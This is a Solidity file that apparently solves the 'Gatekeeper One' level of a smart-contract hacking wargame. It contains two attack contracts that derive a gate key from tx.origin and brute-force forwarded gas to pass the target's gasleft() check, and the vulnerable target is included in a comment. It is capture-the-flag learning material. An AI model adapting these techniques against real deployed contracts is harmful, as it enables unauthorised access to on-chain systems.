pragma solidity ^0.6.4;
// import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/math/SafeMath.sol';


/* 
Gatekeeper One
Level completed!
Difficulty 5/10

Make it past the gatekeeper and register as an entrant to pass this level.

Things that might help:
Remember what you've learned from the Telephone and Token levels.
You can learn more about the special function gasleft(), in Solidity's documentation (see here and here).
Well done! Next, try your hand with the second gatekeeper...
 */




// pragma solidity ^0.5.0;

contract GatekeeperOneAttack {

  constructor(address GatekeeperOneContractAddress) public {
    bytes8 key = bytes8(uint64(uint16(tx.origin)) + 2 ** 32);
    
    // NOTE: the proper gas offset to use will vary depending on the compiler
    // version and optimization settings used to deploy the factory contract.
    // To migitage, brute-force a range of possible values of gas to forward.
    // Using call (vs. an abstract interface) prevents reverts from propagating.
    bytes memory encodedParams = abi.encodeWithSignature(("enter(bytes8)"),
      key
    );

    // gas offset usually comes in around 210, give a buffer of 60 on each side
    for (uint256 i = 0; i < 120; i++) {
      (bool result, bytes memory data) = address(GatekeeperOneContractAddress).call.gas(
          i + 150 + 8191 * 3
        )(
          encodedParams
        );
      if(result)
        {
        break;
      }
    }
  }
}




interface GatekeeperOne {
  function enter(bytes8 _gateKey) external returns (bool);
}


contract GateKeeperOneAttact2 {
    // GatekeeperOne gate = GatekeeperOne(0x8F376Df007eCdc22810A780C2c3b05E639B000A6);
    
    // using SafeMath for uint256;
    bytes8 txOrigin16 = 0x0123456789abcdef; //last 16 digits of your account
    bytes8 key = txOrigin16 & 0xFFFFFFFF0000FFFF; 
    GatekeeperOne public gkpOne;

 
    function setGatekeeperOne(address _addr) public{
        gkpOne = GatekeeperOne(_addr);
    }
    
    function letMeIn() public{
         for (uint256 i = 0; i < 120; i++) {
         (bool result, bytes memory data) = address(gkpOne).call{gas:
          i + 150 + 8191*3}(abi.encodeWithSignature("enter(bytes8)", key));
      if(result)
        {
        break;
      }
    }
  }
        
    
}

/*

contract GatekeeperOne {

  using SafeMath for uint256;
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

*/









